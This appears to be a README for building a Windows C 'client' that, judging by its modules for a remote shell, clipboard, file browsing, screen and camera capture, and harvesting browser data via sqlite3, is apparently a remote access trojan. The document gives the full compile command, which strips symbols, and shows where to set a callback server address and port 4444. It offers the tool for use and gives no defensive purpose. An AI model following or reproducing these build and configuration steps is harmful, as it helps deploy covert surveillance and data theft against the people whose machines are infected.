# C Client Build and Run Instructions

This directory contains the C translation of the client application.

## Prerequisites
- **Windows:** GCC (MinGW-w64) installed and in your PATH. We recommend the MSYS2 or WinLibs distributions.
- **Linux (Cross-compilation):** `x86_64-w64-mingw32-gcc` installed (usually part of the `mingw-w64` package).

## Building

### On Windows
Run the provided batch file:
```cmd
build.bat
```
Or manually run the GCC command:
```cmd
gcc -Iinclude -O3 -s -D_WIN32_WINNT=0x0601 src/main.c src/utils.c src/sysinfo.c src/shell.c src/tasks.c src/clipboard.c src/filebrowser.c src/rfe.c src/screen.c src/camera.c src/browser.c src/cJSON.c src/miniz_common.c src/miniz_tdef.c src/miniz_tinfl.c src/miniz_zip.c src/sqlite3.c -lws2_32 -lwinhttp -lbcrypt -lcrypt32 -lgdi32 -lole32 -lmf -lmfplat -lmfreadwrite -lmfuuid -luser32 -lpsapi -lshlwapi -o client_c.exe
```

### On Linux (Cross-compile)
Run make:
```bash
make
```

## Configuration
The server host and port are defined in `src/main.c`:
```c
#define HOST "192.168.1.7"
#define PORT 4444
```
Update these values before building if necessary.

## Libraries Used
- **cJSON:** Lightweight JSON parsing.
- **miniz:** Deflate/Inflate and ZIP archive support.
- **sqlite3:** Database access for browser data.
- **stbi_image_write:** JPEG encoding for screen/camera captures.
- **Win32 API:** Core system functionality (Networking, GDI, Media Foundation, Debugging).

## Troubleshooting
- **Missing Headers:** Ensure your MinGW installation includes Media Foundation headers (`mfapi.h`, `mfidl.h`, etc.).
- **Undefined Symbols:** If you get undefined references for `mz_adler32` or `mz_crc32`, ensure `src/miniz_common.c` is included in your build command.
- **Library Linking:** The order of `-l` flags matters. Ensure libraries are listed after the source files.
